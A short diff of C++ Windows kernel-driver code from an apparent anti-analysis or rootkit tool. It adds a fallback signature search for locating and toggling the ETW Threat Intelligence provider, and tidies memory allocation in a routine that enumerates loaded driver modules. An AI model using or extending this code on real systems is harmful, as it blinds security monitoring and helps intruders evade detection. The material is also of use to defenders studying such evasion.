@@ -67,8 +67,15 @@ NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
 			searchedRoutineAddress, targetFunctionDistance,
 			&foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
 
-		if (!searchedRoutineOffset)
-			return STATUS_NOT_FOUND;
+		if (!searchedRoutineOffset) {
+			searchedRoutineOffset = (PLONG)FindPattern((PUCHAR)&EtwThreatIntProvRegHandleSignature3,
+				0xCC, etwThreatIntProvRegHandleSigLen - 1,
+				searchedRoutineAddress, targetFunctionDistance,
+				&foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);
+
+			if (!searchedRoutineOffset)
+				return STATUS_NOT_FOUND;
+		}
 	}
 	PUCHAR etwThreatIntProvRegHandle = (PUCHAR)searchedRoutineAddress + (*searchedRoutineOffset) + foundIndex + EtwThreatIntProvRegHandleOffset;
 	ULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();
@@ -630,7 +637,7 @@ NTSTATUS AntiAnalysis::MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_P
 	while (status == STATUS_INFO_LENGTH_MISMATCH) {
 		if (info)
 			ExFreePoolWithTag(info, DRIVER_TAG);
-		info = (PRTL_PROCESS_MODULES)AllocateMemory(infoSize);
+		info = AllocateMemory<PRTL_PROCESS_MODULES>(infoSize);
 
 		if (!info) {
 			status = STATUS_INSUFFICIENT_RESOURCES;
